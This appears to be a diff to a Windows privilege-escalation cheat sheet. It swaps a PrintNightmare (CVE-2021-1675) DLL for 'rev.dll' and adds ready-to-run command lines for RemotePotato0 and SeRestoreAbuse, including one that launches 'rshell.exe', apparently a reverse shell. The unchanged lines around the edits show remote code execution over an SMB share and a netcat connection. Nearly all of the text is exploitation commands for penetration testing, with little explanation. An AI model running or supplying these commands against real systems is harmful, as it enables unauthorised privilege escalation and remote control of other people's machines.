@@ -76,7 +76,7 @@ nc <target> 8282
 * **cube0x0** - *CVE-2021-1675* - [SharpPrintNightmare](https://github.com/cube0x0/CVE-2021-1675)
 ```
 #LPE
-C:\SharpPrintNightmare.exe C:\addCube.dll
+C:\SharpPrintNightmare.exe C:\rev.dll
 
 #RCE using existing context
 SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' '\\192.168.1.20'
@@ -93,3 +93,24 @@ In case we didn't get fully tty shell, watch.sh similar to watch and procmon.sh 
 ./watch.sh /opt/script/tmp/
 ./procmon.sh <time (default=300)>
 ```
+### RemotePotato0.exe
+
+* **antonioCoco** - *potato variant* - [RemotePotato0](https://github.com/antonioCoco/RemotePotato0)
+```
+#user session must exist
+query user
+.\RemotePotato0.exe -m 0 -r 10.0.0.20 -x 10.0.0.20 -p 9999 -s 1
+
+#try different module
+RemotePotato0.exe -m 1 -l 9997 -r 10.0.0.20
+RemotePotato0.exe -m 2 -s 1
+RemotePotato0.exe -m 3 -l 9997
+ ```
+ 
+ ### SeRestoreAbuse.exe
+
+* **xct** - *Windows Privesc* - [SeRestoreAbuse](https://github.com/xct/SeRestoreAbuse)
+```
+SeRestoreAbuse.exe "cmd /c ..."
+SeRestoreAbuse.exe "cmd /c C:\temp\rshell.exe"
+ ```
